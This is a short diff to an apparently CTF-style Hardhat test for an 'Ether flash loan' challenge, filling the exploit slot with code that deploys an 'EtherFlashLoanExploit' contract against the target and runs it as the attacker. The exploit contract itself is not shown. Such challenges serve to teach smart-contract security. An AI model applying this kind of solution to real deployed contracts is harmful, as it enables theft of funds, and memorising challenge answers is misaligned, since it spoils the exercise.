@@ -24,6 +24,10 @@ describe('[ETHER FLASH LOAN EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let exploit = await (await ethers.getContractFactory('EtherFlashLoanExploit', deployer)).deploy(this.etherFlashLoan.address)
+
+        await exploit.connect(attacker).run();
+
     })
 
     after(async function () {
